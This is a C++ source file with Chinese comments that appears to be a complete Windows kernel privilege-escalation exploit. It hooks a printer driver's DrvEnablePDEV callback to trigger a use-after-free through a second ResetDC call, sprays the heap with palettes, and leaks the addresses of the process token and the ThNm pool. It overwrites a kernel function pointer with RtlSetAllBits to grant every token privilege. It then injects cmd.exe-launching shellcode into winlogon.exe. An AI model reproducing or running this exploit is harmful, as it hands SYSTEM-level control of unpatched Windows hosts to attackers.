#include <Windows.h>
#include <stdio.h>
#include <winddi.h>
#include <winternl.h>
#include <tlhelp32.h>
#include <psapi.h>
#pragma comment(lib, "ntdll.lib")

// 定义函数指针
typedef bool(*DrvEnableDriver_t)(ULONG iEngineVersion, ULONG cj, DRVENABLEDATA* pded);
typedef DHPDEV(*DrvEnablePDEV_t)(DEVMODEW* pdm, LPWSTR pwszLogAddress, ULONG cPat, HSURF* phsurfPatterns, ULONG cjCaps, ULONG* pdevcaps, ULONG cjDevInfo, DEVINFO* pdi, HDEV hdev, LPWSTR pwszDeviceName, HANDLE hDriver);
typedef void(*VoidFunc_t)();
typedef NTSTATUS(*fnNtSetInformationThreadPtr)(HANDLE threadHandle, THREADINFOCLASS threadInformationClass, PVOID threadInformation, ULONG threadInformationLength);


fnNtSetInformationThreadPtr NtSetInformationThread = nullptr;
#define SystemBigPoolInformation 0x42
#define ThreadNameInformation 0x26

// 存储bitmap地址bitmap的buffer里面是自身权限位所在地址
DWORD64 Fake_RtlBitMapAddr = 0;
// 存储RtlSetAllBits地址
DWORD64 GadgetAddr = 0;

typedef struct
{
	DWORD64 Address;
	DWORD64 PoolSize;
	char PoolTag[4];
	char Padding[4];
} BIG_POOL_INFO, * PBIG_POOL_INFO;
typedef struct _DriverHook
{
	ULONG index;
	FARPROC func;
} DriverHook;

DHPDEV hook_DrvEnablePDEV(DEVMODEW* pdm, LPWSTR pwszLogAddress, ULONG cPat, HSURF* phsurfPatterns, ULONG cjCaps, ULONG* pdevcaps, ULONG cjDevInfo, DEVINFO* pdi, HDEV hdev, LPWSTR pwszDeviceName, HANDLE hDriver);

DriverHook driverHooks[] = {
	{ INDEX_DrvEnablePDEV, (FARPROC)hook_DrvEnablePDEV },
};

namespace globals
{

	LPSTR printerName;
	HDC hdc;
	int counter;
	bool should_trigger;
	bool ignore_callbacks;
	VoidFunc_t origDrvFuncs[INDEX_LAST];
}

// size=0xe20
HPALETTE createPaletteofSize1(int size) {

	int pal_cnt = (size - 0x90) / 4;
	int palsize = sizeof(LOGPALETTE) + (pal_cnt - 1) * sizeof(PALETTEENTRY);
	LOGPALETTE* lPalette = (LOGPALETTE*)malloc(palsize);
	// p指向palPalEntry
	DWORD64* p = (DWORD64*)((DWORD64)lPalette + 4);
	memset(lPalette, 0xff, palsize);

	// 在1607的内核中，存放DC堆头地址-DC地址为0x30，DC对象函数指针地址-DC地址=0xad0
	// |___________________________________________________________________________________________|
	// \	 |     |0x30		|0x90+sizeof(heap header)		|0x30+0xad0	       \
	//  堆头        \                \				       \		      0xe30
	//		DC	         PALETTE				 函数指针地址
	// 综上得知第(0x30+0xad0-0x90-sizeof(heap header))/sizeof(PALETTEENTRY)个PALETTEENTRY的地址为函数指针地址
	// 在POC中指针P被强转为DWORD*类型指针，步进大小为8个字节，所以此处0x15a-8-5=14d=0xa68/8 刚刚好到函数指针地址
	// 将函数指针值覆盖为RtlSetAllBits函数地址
	// RtlSetAllBits会将传入的BitMap结构的Buffer的位全部置1
	p[0x15A - 0x8 - 0x5] = GadgetAddr;

	// RtlSetAllBits参数在DC对象的位置
	p[0xE4 - 0x8 - 0x5] = Fake_RtlBitMapAddr;

	lPalette->palNumEntries = pal_cnt;
	lPalette->palVersion = 0x300;
	// 在64bit上CreatePalette通过系统调用进入内核后会申请sizeof(PALETTE)-8+4*palNumEntries大小的堆存放PALETTE，在x64环境中PATLETTE大小为0x90，从0x90开始为PALETTEENTRY的内容
	return CreatePalette(lPalette);
}

DHPDEV hook_DrvEnablePDEV(DEVMODEW* pdm, LPWSTR pwszLogAddress, ULONG cPat, HSURF* phsurfPatterns, ULONG cjCaps, ULONG* pdevcaps, ULONG cjDevInfo, DEVINFO* pdi, HDEV hdev, LPWSTR pwszDeviceName, HANDLE hDriver)
{
	puts("[*] Hooked DrvEnablePDEV called");

	// 执行原来的回调，确保功能不受影响
	DHPDEV res = ((DrvEnablePDEV_t)globals::origDrvFuncs[INDEX_DrvEnablePDEV])(pdm, pwszLogAddress, cPat, phsurfPatterns, cjCaps, pdevcaps, cjDevInfo, pdi, hdev, pwszDeviceName, hDriver);

	if (globals::should_trigger == true)
	{

		// 只想执行一次 恶意代码避免死循环
		globals::should_trigger = false;

		puts("[*] Triggering UAF with second ResetDC");


		printf("second use ResetDCA function\n");
		//再次执行ResetDC并传入相同HDC句柄，会释放HDC对应的DC对象 造成free
		HDC tmp_hdc = ResetDCA(globals::hdc, NULL);
		puts("[*] Returned from second ResetDC");

		for (int i = 0; i < 0x10000; i++)
		{
			// 进行堆喷，确保可以申请到刚释放的内存，此处为use
			createPaletteofSize1(0xe20);
		}
		puts("[*] Get ready for DoS");
	}

	return res;
}

// 设置用户模式的回调，会覆盖原有的回调表中的函数指针。
bool SetupUsermodeCallbackHook()
{
	DrvEnableDriver_t DrvEnableDriver;
	VoidFunc_t DrvDisableDriver;
	DWORD pcbNeeded, pcbReturned;
	PRINTER_INFO_4A* pPrinterEnum, * printerInfo;
	HANDLE hPrinter;
	DRIVER_INFO_2A* driverInfo;
	HMODULE hModule;
	DRVENABLEDATA drvEnableData;
	DWORD lpflOldProtect, _lpflOldProtect;
	bool res;

	// 查找可用的打印机，确定要申请多大内存存放
	EnumPrintersA(PRINTER_ENUM_LOCAL, NULL, 4, NULL, 0, &pcbNeeded, &pcbReturned);

	if (pcbNeeded <= 0)
	{
		puts("[-] Failed to find any available printers");
		return false;
	}

	pPrinterEnum = (PRINTER_INFO_4A*)malloc(pcbNeeded);

	if (pPrinterEnum == NULL)
	{
		puts("[-] Failed to allocate buffer for pPrinterEnum");
		return false;
	}

	// 枚举所有可用的打印机、打印服务器，域或者打印服务提供者存放到缓冲区
	res = EnumPrintersA(PRINTER_ENUM_LOCAL, NULL, 4, (LPBYTE)pPrinterEnum, pcbNeeded, &pcbNeeded, &pcbReturned);

	if (res == false || pcbReturned <= 0)
	{
		puts("[-] Failed to enumerate printers");
		return false;
	}

	// Loop over printers
	// 循环遍历设置回调
	for (DWORD i = 0; i < pcbReturned; i++)
	{
		printerInfo = &pPrinterEnum[0];

		printf("[*] Using printer: %s\n", printerInfo->pPrinterName);

		// Open printer
		// 返回打印机句柄
		res = OpenPrinterA(printerInfo->pPrinterName, &hPrinter, NULL);
		if (!res)
		{
			puts("[-] Failed to open printer");
			continue;
		}

		printf("[+] Opened printer: %s\n", printerInfo->pPrinterName);

		// 拷贝打印机名字字符串到全局命名空间的变量内
		globals::printerName = _strdup(printerInfo->pPrinterName);

		// Get the printer driver
		// 获取对应的驱动信息
		GetPrinterDriverA(hPrinter, NULL, 2, NULL, 0, &pcbNeeded);

		driverInfo = (DRIVER_INFO_2A*)malloc(pcbNeeded);

		res = GetPrinterDriverA(hPrinter, NULL, 2, (LPBYTE)driverInfo, pcbNeeded, &pcbNeeded);

		if (res == false)
		{
			printf("[-] Failed to get printer driver\n");
			continue;
		}

		// 打印对应的驱动dll路径
		printf("[*] Driver DLL: %s\n", driverInfo->pDriverPath);

		// 载入对应的驱动dll
		hModule = LoadLibraryExA(driverInfo->pDriverPath, NULL, LOAD_WITH_ALTERED_SEARCH_PATH);

		if (hModule == NULL)
		{
			printf("[-] Failed to load printer driver\n");
			continue;
		}

		// 从驱动dll中获取DrvEnableDriver函数u地址
		DrvEnableDriver = (DrvEnableDriver_t)GetProcAddress(hModule, "DrvEnableDriver");
		// 从驱动dll中获取DrvDisableDriver函数地址
		DrvDisableDriver = (VoidFunc_t)GetProcAddress(hModule, "DrvDisableDriver");

		if (DrvEnableDriver == NULL || DrvDisableDriver == NULL)
		{
			printf("[-] Failed to get exported functions from driver\n");
			continue;
		}

		// 获取目标打印机驱动的回调表
		res = DrvEnableDriver(DDI_DRIVER_VERSION_NT4, sizeof(DRVENABLEDATA), &drvEnableData);

		if (res == false)
		{
			printf("[-] Failed to enable driver\n");
			continue;
		}

		puts("[+] Enabled printer driver");

		// Unprotect the driver's usermode callback table, such that we can overwrite entries
		// 设置用户回调表保护权限，使之可以修改回调表
		res = VirtualProtect(drvEnableData.pdrvfn, drvEnableData.c * sizeof(PFN), PAGE_READWRITE, &lpflOldProtect);

		if (res == false)
		{
			puts("[-] Failed to unprotect printer driver's usermode callback table");
			continue;
		}

		// 循环遍历想要设置的自定义函数
		for (int i = 0; i < sizeof(driverHooks) / sizeof(DriverHook); i++)
		{
			// 遍历回调表并覆盖里面的函数指针
			for (DWORD n = 0; n < drvEnableData.c; n++)
			{
				ULONG iFunc = drvEnableData.pdrvfn[n].iFunc;

				// Check if hook INDEX matches entry INDEX
				if (driverHooks[i].index == iFunc)
				{
					// 保存原来的函数指针
					globals::origDrvFuncs[iFunc] = (VoidFunc_t)drvEnableData.pdrvfn[n].pfn;
					// 覆盖函数指针
					drvEnableData.pdrvfn[n].pfn = (PFN)driverHooks[i].func;
					break;
				}
			}
		}
		// Disable driver
		DrvDisableDriver();

		VirtualProtect(drvEnableData.pdrvfn, drvEnableData.c * sizeof(PFN), lpflOldProtect, &_lpflOldProtect);

		return true;
	}

	return false;
}

typedef struct _SYSTEM_MODULE_ENTRY_INFO
{
	HANDLE Section;
	PVOID MappedBase;
	PVOID ImageBase;
	ULONG ImageSize;
	ULONG Flags;
	USHORT LoadOrderIndex;
	USHORT InitOrderIndex;
	USHORT LoadCount;
	USHORT OffsetToFileName;
	UCHAR FullPathName[256];
} SYSTEM_MODULE_ENTRY_INFO, * PSYSTEM_MODULE_ENTRY_INFO;

typedef struct _SYSTEM_MODULE_INFORMATION
{
	ULONG NumberOfModules;
	SYSTEM_MODULE_ENTRY_INFO Modules[1];
} SYSTEM_MODULE_INFORMATION, * PSYSTEM_MODULE_INFORMATION;

#define  SystemExtendedHandleInformation 64
#define SystemHandleInformation 0x10
#define SystemModuleInformation  0xb

//获取指定模块地址
DWORD64 GetModuleAddr(const char* modName)
{
	PSYSTEM_MODULE_INFORMATION buffer = (PSYSTEM_MODULE_INFORMATION)malloc(0x20);

	DWORD outBuffer = 0;
	NTSTATUS status = NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)SystemModuleInformation, buffer, 0x20, &outBuffer);

	if (status == ((NTSTATUS)0xC0000004L))//STATUS_INFO_LENGTH_MISMATCH
	{
		free(buffer);
		buffer = (PSYSTEM_MODULE_INFORMATION)malloc(outBuffer);
		status = NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)SystemModuleInformation, buffer, outBuffer, &outBuffer);
	}

	if (!buffer)
	{
		printf("[-] NtQuerySystemInformation error\n");
		return 0;
	}

	for (unsigned int i = 0; i < buffer->NumberOfModules; i++)
	{
		PVOID kernelImageBase = buffer->Modules[i].ImageBase;
		PCHAR kernelImage = (PCHAR)buffer->Modules[i].FullPathName;
		if (_stricmp(kernelImage, modName) == 0)
		{
			free(buffer);
			return (DWORD64)kernelImageBase;
		}
	}
	free(buffer);
	return 0;
}
// 从ntoskrnl获取RtlSetAllBits地址
DWORD64 GetGadgetAddr(const char* name)
{
	DWORD64 base = GetModuleAddr("\\SystemRoot\\system32\\ntoskrnl.exe");
	HMODULE mod = LoadLibraryEx(L"ntoskrnl.exe", NULL, DONT_RESOLVE_DLL_REFERENCES);
	if (!mod)
	{
		printf("[-] leaking ntoskrnl version\n");
		return 0;
	}
	DWORD64 offset = (DWORD64)GetProcAddress(mod, name);
	DWORD64 returnValue = base + offset - (DWORD64)mod;
	//printf("[+] FunAddr: %p\n", (DWORD64)returnValue);
	FreeLibrary(mod);
	return returnValue;
}
typedef struct _SYSTEM_HANDLE_TABLE_ENTRY_INFO {
	USHORT UniqueProcessId;
	USHORT CreatorBackTraceIndex;
	UCHAR ObjectTypeIndex;
	UCHAR HandleAttributes;
	USHORT HandleValue;
	PVOID Object;
	ULONG GrantedAccess;
} SYSTEM_HANDLE_TABLE_ENTRY_INFO, * PSYSTEM_HANDLE_TABLE_ENTRY_INFO;


typedef struct _SYSTEM_HANDLE_INFORMATION {
	ULONG NumberOfHandles;
	SYSTEM_HANDLE_TABLE_ENTRY_INFO Handles[1];
} SYSTEM_HANDLE_INFORMATION, * PSYSTEM_HANDLE_INFORMATION;
DWORD64 GetKernelPointer(HANDLE handle, DWORD type)
{
	// 申请0x20的空间
	PSYSTEM_HANDLE_INFORMATION buffer = (PSYSTEM_HANDLE_INFORMATION)malloc(0x20);

	DWORD outBuffer = 0;
	// 查询自身拥有的所有句柄信息
	NTSTATUS status = NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)SystemHandleInformation, buffer, 0x20, &outBuffer);

	if (status == (NTSTATUS)0xC0000004L)
	{
		free(buffer);
		buffer = (PSYSTEM_HANDLE_INFORMATION)malloc(outBuffer);
		status = NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)SystemHandleInformation, buffer, outBuffer, &outBuffer);
	}

	if (!buffer)
	{
		printf("[-] NtQuerySystemInformation error \n");
		return 0;
	}

	for (size_t i = 0; i < buffer->NumberOfHandles; i++)
	{
		DWORD objTypeNumber = buffer->Handles[i].ObjectTypeIndex;

		// type 0x5 token
		if (buffer->Handles[i].UniqueProcessId == GetCurrentProcessId() && buffer->Handles[i].ObjectTypeIndex == type)
		{
			if (handle == (HANDLE)buffer->Handles[i].HandleValue)
			{
				DWORD64 object = (DWORD64)buffer->Handles[i].Object;
				free(buffer);
				return object;
			}
		}
	}
	printf("[-] handle not found\n");
	free(buffer);
	return 0;
}


LPVOID ntoskrnlBase = nullptr;
DWORD64 LeakEporcessKtoken()
{

	LPVOID drivers[1024] = {};
	DWORD cbNeeded = NULL;
	ntoskrnlBase = nullptr;
	// 检索系统驱动加载地址
	if (EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded) && cbNeeded < sizeof(drivers))
	{
		// 获取ntoskrnl基址
		if (drivers[0])
		{
			ntoskrnlBase = drivers[0];
			printf("[-] ntoskrnlBase=%p\n", ntoskrnlBase);
		}
	}
	else
	{
		printf("[-] EnumDeviceDrivers failed; array size needed is %d\n", cbNeeded / sizeof(LPVOID));
	}

	// 获取自身句柄
	HANDLE proc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, GetCurrentProcessId());
	if (!proc)
	{
		printf("[-] OpenProcess failed\n");
		return 0;
	}

	HANDLE token = 0;
	// 需要启用或者禁用token里面的权限
	if (!OpenProcessToken(proc, TOKEN_ADJUST_PRIVILEGES, &token))
	{
		printf("[-] OpenProcessToken failed\n");
		return 0;
	}

	DWORD64 ktoken = 0;
	for (int i = 0; i < 0x100; i++)
	{
		// 获取自身token的地址
		ktoken = GetKernelPointer(token, 0x5);

		if (ktoken != NULL)
		{
			break;
		}

	}
	return ktoken;
}
int  fnExploit(int lpParameter)
{


	do
	{
		Sleep(0x500000);


	} while (true);


}

DWORD64 LeakTheadNamePoolAddr(DWORD64 ktoken)
{
	DWORD dwThreadID = 0;

	// 新建线程获取对应的句柄
	HANDLE	hThread = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)fnExploit, 0, 0, &dwThreadID);
	printf("[-] hTread==%p,dwThreadID==%d\n", hThread, dwThreadID);
	USHORT dwSize = 4096;


	// 申请空间，当作bitmap结构
	LPVOID lpMessageToStore = VirtualAlloc(0, dwSize, MEM_COMMIT, PAGE_READWRITE);


	memset(lpMessageToStore, 0x41, 0x20);

	/*
	* BitMap结构
	typedef struct _RTL_BITMAP {
		ULONG  SizeOfBitMap;
		ULONG *Buffer;
	} RTL_BITMAP, *PRTL_BITMAP;
	*/

	//BitMapHeader->SizeOfBitMap
	* (DWORD64*)lpMessageToStore = 0x80;

	//BitMapHeader->Buffer
	*(DWORD64*)((DWORD64)lpMessageToStore + 8) = ktoken;

	UNICODE_STRING target = {};
	target.Length = dwSize;
	target.MaximumLength = 0xffff;
	target.Buffer = (PWSTR)lpMessageToStore;


	// 当NtSetInformationThread传入的flag为0先6时将在内核设置Thread Name属性，会在内核申请sizeof(UNICODE_STRING)+sizeof(UNICODE_STRING.Buffer)大小的堆空间，并且其tag为ThNm
	// 参考 https://blahcat.github.io/2019/03/17/small-dumps-in-the-big-pool/
	HRESULT hRes = NtSetInformationThread(hThread, (THREADINFOCLASS)ThreadNameInformation, &target, 0x10);

	DWORD dwBufSize = 1024 * 1024;
	DWORD dwOutSize;
	LPVOID pBuffer = LocalAlloc(LPTR, dwBufSize);

	/*
	 查询进程拥有的大堆，使用pBuffer存放
	 pBuffer结构为
	 pBuffer结构如下，AllocatedInfo为SYSTEM_BIGPOOL_ENTRY的数组，大小为进程拥有的BigPool数目
	 typedef struct _SYSTEM_BIGPOOL_ENTRY {
		union {
			PVOID     VirtualAddress;
			ULONG_PTR NonPaged : 1;
		};
		ULONG_PTR SizeInBytes;
		union {
			UCHAR Tag[4];
			ULONG TagUlong;
		};
	} SYSTEM_BIGPOOL_ENTRY, *PSYSTEM_BIGPOOL_ENTRY;

	typedef struct
	{
		ULONG                Count;
		SYSTEM_BIGPOOL_ENTRY AllocatedInfo[anysize_of_array];
	} SYSTEM_BIGPOOL_INFORMATION, *PSYSTEM_BIGPOOL_INFORMATION;
	参考https://www.geoffchappell.com/studies/windows/km/ntoskrnl/api/ex/sysinfo/bigpool.htm
	*/

	hRes = NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)SystemBigPoolInformation, pBuffer, dwBufSize, &dwOutSize);

	DWORD dwExpectedSize = target.Length + sizeof(UNICODE_STRING);

	ULONG_PTR StartAddress = (ULONG_PTR)pBuffer;
	// StartAddress + 8 为SYSTEM_BIGPOOL_ENTRY数组偏移
	ULONG_PTR EndAddress = StartAddress + 8 + *((PDWORD)StartAddress) * sizeof(BIG_POOL_INFO);
	ULONG_PTR ptr = StartAddress + 8;
	while (ptr < EndAddress)
	{
		// 开始遍历SYSTEM_BIGPOOL_ENTRY数组
		PBIG_POOL_INFO info = (PBIG_POOL_INFO)ptr;
		/* 如果堆的tag和大小都符合则认为找到了NtSetInformationThread申请到堆，此时内存布局为
		|______________________________________
		|	sizeof(UNICODE_STRING)|\		\
		内核堆内存					BitMap	BitMap.Buffer指向ktoken
		BitMap.Buffer指向自身权限位，即BitMap.Buffer存放了自身进程权限地址

		*/
		if (strncmp(info->PoolTag, "ThNm", 4) == 0 && dwExpectedSize == info->PoolSize)
		{

			return (((ULONG_PTR)info->Address) & 0xfffffffffffffff0) + sizeof(UNICODE_STRING);
		}
		ptr += sizeof(BIG_POOL_INFO);
	}

	printf("[-] Lead Pool Addr Failed\n");

	return NULL;
}
// run cmd.exe
unsigned char shellcode[] =
"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52\x51" \
"\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52" \
"\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0" \
"\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed" \
"\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88" \
"\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44" \
"\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48" \
"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1" \
"\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44" \
"\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49" \
"\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a" \
"\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41" \
"\x59\x5a\x48\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00" \
"\x00\x00\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b" \
"\x6f\x87\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd\x9d\xff" \
"\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47" \
"\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x6d\x64\x2e\x65" \
"\x78\x65\x00";

void InjectToWinlogon()
{
	PROCESSENTRY32 entry;
	entry.dwSize = sizeof(PROCESSENTRY32);

	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);

	int pid = -1;
	if (Process32First(snapshot, &entry))
	{
		while (Process32Next(snapshot, &entry))
		{
			if (wcscmp(entry.szExeFile, L"winlogon.exe") == 0)
			{
				pid = entry.th32ProcessID;
				break;
			}
		}
	}

	CloseHandle(snapshot);

	if (pid < 0)
	{
		printf("Could not find process\n");
		return;
	}

	HANDLE h = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
	if (!h)
	{
		printf("Could not open process: %x", GetLastError());
		return;
	}

	void* buffer = VirtualAllocEx(h, NULL, sizeof(shellcode), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (!buffer)
	{
		printf("[-] VirtualAllocEx failed\n");
	}

	if (!buffer)
	{
		printf("[-] remote allocation failed");
		return;
	}

	if (!WriteProcessMemory(h, buffer, shellcode, sizeof(shellcode), 0))
	{
		printf("[-] WriteProcessMemory failed");
		return;
	}

	HANDLE hthread = CreateRemoteThread(h, 0, 0, (LPTHREAD_START_ROUTINE)buffer, 0, 0, 0);

	if (hthread == INVALID_HANDLE_VALUE)
	{
		printf("[-] CreateRemoteThread failed");
		return;
	}
}


int main()
{
	// 获取NtSetInformationThread的地址
	NtSetInformationThread = (fnNtSetInformationThreadPtr)GetProcAddress(LoadLibrary(L"ntdll.dll"), "NtSetInformationThread");


	if (NtSetInformationThread == NULL)
	{
		printf("[-] Getting NtSetInformationThread Failed\n");
	}

	// 获取自身token的地址
	DWORD64 ktoken = LeakEporcessKtoken();

	printf("[-] ktoken addr =%p\n", ktoken);

	// 从ntoskrnl.exe获取RtlSetAllBits函数地址
	GadgetAddr = GetGadgetAddr("RtlSetAllBits");

	printf("[-] GadgetAddr addr =%p\n", GadgetAddr);

	// ktoken + 0x40 是 _SEP_TOKEN_PRIVILEGES结构体地址，里面记录了被允许的特权
	Fake_RtlBitMapAddr = LeakTheadNamePoolAddr(ktoken + 0x40);

	printf("[-] Fake_RtlBitMapAddr=%p\n", Fake_RtlBitMapAddr);



	bool res = false;

	// Setup hook for usermode callbacks on a printer
	// 设置用户回调函数
	res = SetupUsermodeCallbackHook();

	if (res == false)
	{
		printf("[-] Failed to setup usermode callback\n");
	}

	// Create new device context for printer with driver's hooked callbacks
	// 创建全局的HDC对象 返回对应句柄
	printf("Create global HDC object\n");
	globals::hdc = CreateDCA(NULL, globals::printerName, NULL, NULL);
	if (globals::hdc == NULL)
	{
		puts("[-] Failed to create device context");
		return -1;
	}

	globals::should_trigger = true;
	printf("first use ResetDC function\n");
	ResetDC(globals::hdc, NULL);


	printf("[-] InjectToWinlogon\n");

	// 将shellcode注入进程
	InjectToWinlogon();
	puts("[*] Done");

	return 0;
}
